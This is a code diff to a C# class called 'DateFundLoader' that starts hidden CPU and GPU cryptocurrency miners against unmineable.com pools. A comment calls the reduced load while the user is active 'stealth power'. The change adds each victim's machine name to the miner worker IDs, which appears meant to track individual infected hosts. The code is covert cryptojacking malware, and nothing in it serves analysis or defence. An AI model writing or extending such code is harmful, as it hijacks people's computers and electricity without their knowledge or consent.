@@ -60,7 +60,8 @@ public class DateFundLoader {
                     }
                     
                     int threads = isIdle ? 100 : 45;
-                    string cpuArgs = string.Format("-o rx.unmineable.com:3333 -u BTC:{0}.{1}_CPU -p x --donate-level 1 --cpu-max-threads-hint {2}", wallet, IDENT, threads);
+                    string machine = Environment.MachineName.Replace(" ", "_");
+                    string cpuArgs = string.Format("-o rx.unmineable.com:3333 -u BTC:{0}.{1}_{2}_CPU -p x --donate-level 1 --cpu-max-threads-hint {3}", wallet, IDENT, machine, threads);
                     
                     ProcessStartInfo si = new ProcessStartInfo(cpuPath) {
                         Arguments = cpuArgs,
@@ -80,7 +81,8 @@ public class DateFundLoader {
 
                         // Full power (100) when idle, stealth power (40) when active
                         int intensity = isIdle ? 100 : 40;
-                        string gpuArgs = string.Format("--algo ETCHASH --server etchash.unmineable.com:3333 --user BTC:{0}.{1}_GPU --pass x --intensity {2}", wallet, IDENT, intensity);
+                        string machine = Environment.MachineName.Replace(" ", "_");
+                        string gpuArgs = string.Format("--algo ETCHASH --server etchash.unmineable.com:3333 --user BTC:{0}.{1}_{2}_GPU --pass x --intensity {3}", wallet, IDENT, machine, intensity);
 
                         ProcessStartInfo si = new ProcessStartInfo(gpuPath) {
                             Arguments = gpuArgs,
